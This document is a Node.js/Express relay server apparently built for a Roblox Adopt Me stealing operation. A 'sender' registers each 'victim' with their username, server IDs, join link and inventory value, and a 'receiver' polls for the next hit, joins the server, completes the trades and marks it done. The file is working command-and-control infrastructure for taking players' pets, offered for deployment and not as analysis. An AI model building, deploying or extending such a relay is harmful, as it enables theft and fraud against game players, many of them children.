/**
 * ================================================================
 *  ADOPT ME TRADE RELAY  —  Railway Deployment
 *  Node.js / Express
 *
 *  Endpoints:
 *    POST /hit          — Sender registers a new hit
 *    GET  /hit/latest   — Receiver polls for next ACTIVE hit
 *    POST /hit/done     — Receiver marks current hit as done
 *    GET  /health       — Uptime / queue status
 *
 *  Environment variables (set in Railway dashboard):
 *    PORT          — assigned automatically by Railway
 *    RELAY_SECRET  — shared secret key (required)
 * ================================================================
 */

"use strict";

const express    = require("express");
const bodyParser = require("body-parser");

const app = express();
app.use(bodyParser.json());

// ── Configuration ────────────────────────────────────────────────
const PORT         = process.env.PORT         || 3000;
const RELAY_SECRET = process.env.RELAY_SECRET || "change_me_in_railway_env";

// ── In-memory hit queue ──────────────────────────────────────────
/**
 * Hit schema:
 * {
 *   id:         string   — unique hit ID
 *   senderName: string   — Roblox username of sender
 *   placeId:    string   — Roblox Place ID
 *   jobId:      string   — Roblox Job/Server ID (unique per instance)
 *   joinLink:   string   — kebabman join URL
 *   totalValue: number   — total inventory value
 *   petsCount:  number   — number of tradeable pets
 *   status:     "active" | "done"
 *   createdAt:  number   — unix ms timestamp
 *   doneAt:     number | null
 * }
 */
const hitQueue  = [];
let   hitCursor = 0;  // index of first hit the receiver has NOT yet processed

// ── Auth middleware ──────────────────────────────────────────────
function requireAuth(req, res, next) {
    const key = req.headers["x-relay-key"];
    if (!key || key !== RELAY_SECRET) {
        return res.status(401).json({ ok: false, error: "Unauthorized" });
    }
    next();
}

// ── Unique ID generator ──────────────────────────────────────────
function makeId() {
    return Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
}

// ── POST /hit ────────────────────────────────────────────────────
// Sender calls this when a new victim is loaded and ready.
app.post("/hit", requireAuth, (req, res) => {
    const { senderName, placeId, jobId, joinLink, totalValue, petsCount } = req.body || {};

    if (!senderName || !placeId || !jobId) {
        return res.status(400).json({
            ok: false,
            error: "Missing required fields: senderName, placeId, jobId",
        });
    }

    // Deduplicate: same jobId already in active queue → ignore
    const existing = hitQueue.find(h => h.jobId === String(jobId) && h.status === "active");
    if (existing) {
        console.log(`[HIT  ~] Duplicate ignored id=${existing.id} sender=${existing.senderName}`);
        return res.status(200).json({ ok: true, message: "Duplicate — already queued", id: existing.id });
    }

    const hit = {
        id:         makeId(),
        senderName: String(senderName),
        placeId:    String(placeId),
        jobId:      String(jobId),
        joinLink:   joinLink || `https://kebabman.vercel.app/start?placeId=${placeId}&gameInstanceId=${jobId}`,
        totalValue: Number(totalValue) || 0,
        petsCount:  Number(petsCount)  || 0,
        status:     "active",
        createdAt:  Date.now(),
        doneAt:     null,
    };

    hitQueue.push(hit);
    console.log(`[HIT  +] id=${hit.id} sender=${hit.senderName} value=${hit.totalValue} pets=${hit.petsCount}`);

    return res.status(201).json({ ok: true, message: "Hit registered", id: hit.id });
});

// ── GET /hit/latest ──────────────────────────────────────────────
// Receiver calls this on a poll loop.
// Returns the oldest ACTIVE hit the receiver has not yet processed.
// Never returns hits created before the receiver connected.
app.get("/hit/latest", requireAuth, (req, res) => {
    // Advance cursor past done hits
    while (hitCursor < hitQueue.length && hitQueue[hitCursor].status === "done") {
        hitCursor++;
    }

    if (hitCursor >= hitQueue.length) {
        return res.status(200).json({ ok: true, hit: null });
    }

    const current = hitQueue[hitCursor];
    if (current.status !== "active") {
        return res.status(200).json({ ok: true, hit: null });
    }

    return res.status(200).json({ ok: true, hit: current });
});

// ── POST /hit/done ───────────────────────────────────────────────
// Receiver calls this once the sender has left the server and all
// trades are complete.  Advances the cursor to unlock the next hit.
app.post("/hit/done", requireAuth, (req, res) => {
    const { id } = req.body || {};
    if (!id) return res.status(400).json({ ok: false, error: "Missing id" });

    const hit = hitQueue.find(h => h.id === id);
    if (!hit) return res.status(404).json({ ok: false, error: "Hit not found" });
    if (hit.status === "done") return res.status(200).json({ ok: true, message: "Already done" });

    hit.status = "done";
    hit.doneAt = Date.now();

    // Advance cursor
    while (hitCursor < hitQueue.length && hitQueue[hitCursor].status === "done") {
        hitCursor++;
    }

    console.log(`[HIT  ✓] id=${hit.id} sender=${hit.senderName} done. cursor→${hitCursor}`);
    return res.status(200).json({ ok: true, message: "Marked done", cursor: hitCursor });
});

// ── GET /health ──────────────────────────────────────────────────
app.get("/health", (_req, res) => {
    res.status(200).json({
        ok:          true,
        uptime:      Math.floor(process.uptime()),
        queueLength: hitQueue.length,
        cursor:      hitCursor,
        pending:     hitQueue.filter(h => h.status === "active").length,
    });
});

// ── Start ────────────────────────────────────────────────────────
app.listen(PORT, () => {
    const secretStatus = RELAY_SECRET === "change_me_in_railway_env"
        ? "⚠️  USING DEFAULT SECRET — CHANGE IT!"
        : "✅ secret configured";
    console.log(`[Relay] Listening on port ${PORT}  (${secretStatus})`);
});
